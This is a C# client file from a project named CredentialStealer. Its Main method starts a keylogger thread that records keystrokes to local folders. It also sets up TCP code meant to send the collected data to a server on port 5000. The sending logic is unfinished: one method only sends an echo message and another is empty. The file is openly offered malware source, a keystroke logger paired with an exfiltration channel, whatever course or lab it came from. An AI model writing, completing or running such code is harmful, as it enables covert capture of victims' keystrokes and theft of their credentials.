using CredentialStealer.Entities;
using CredentialStealer.KeyboardRecorder;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace CredentialStealer.Client.Console
{
    public class Client
    {
        private const int PORT = 5000;
        private const string IP = "127.0.0.1";
        private const string EOF = "<EOF>";
        private const int RETRY_DELAY = 5000;
        
        public static byte[] read(NetworkStream clientStream, Encoding encoder)
        {
            byte[] result = new byte[0];
            int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
            while (true)
            {
                byte[] message = new byte[4096];
                int bytesRead = 0;
                try
                {
                    bytesRead = clientStream.Read(message, 0, 4096);
                }
                catch (Exception exception)
                {
                    System.Console.WriteLine(exception);
                    break;
                }
                if (bytesRead == 0)
                {
                    return result;
                }
                Array.Resize<byte>(ref result, result.Length + bytesRead);
                Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
                if (encoder.GetString(result).EndsWith(EOF))
                {
                    break;
                }
            }
            int eofLength = encoder.GetBytes(EOF).Length;
            byte[] truncatedResult = new byte[result.Length - eofLength];
            Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
            return truncatedResult;
        }

        public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer)
        {
            byte[] plainBuffer = Utils.Utils.ConcatenateBytes(buffer, encoder.GetBytes(EOF));
            clientStream.Write(plainBuffer, 0, plainBuffer.Length);
            clientStream.Flush();
        }

        public void SendInfosToMyServer(string content,IPEndPoint serverEndPoint)
        {

            TcpClient client = new TcpClient();
            client.Connect(serverEndPoint);
            NetworkStream nwStream = client.GetStream();
            ASCIIEncoding encoder = new ASCIIEncoding();


            string textToSend = "echo";
            byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(textToSend);

            //---send the text---
            System.Console.WriteLine("Sending : " + textToSend);
            //nwStream.Write(bytesToSend, 0, bytesToSend.Length);

            Client.write(nwStream, encoder, encoder.GetBytes("Echo"));
            System.Console.WriteLine(encoder.GetString(read(nwStream, encoder)));
            client.Close(); 
        }

       

        public void SendInfosToServer(string content,IPEndPoint serverEndPoint)
        {

        }

        public Client()
        {
            IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
            try
            {


            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public static void Main(string[] args)
        {
            Thread keyLogThread = new Thread(new ThreadStart(KeyLogThreadFunction));
            keyLogThread.Start();
            Thread.Sleep(3000);
            new Client();
        }

        private static void KeyLogThreadFunction()
        {
            try
            {
                KeyLogger kl = new KeyLogger("keylogging", @"C:\ITC\log_src", @"C:\ITC\log_dest");
                while (true)
                {
                    Application.DoEvents();
                }
            }
            catch (Exception e)
            {
                System.Console.WriteLine("Error in KeyLogger Process \n" + e);
            }
        }
    }
}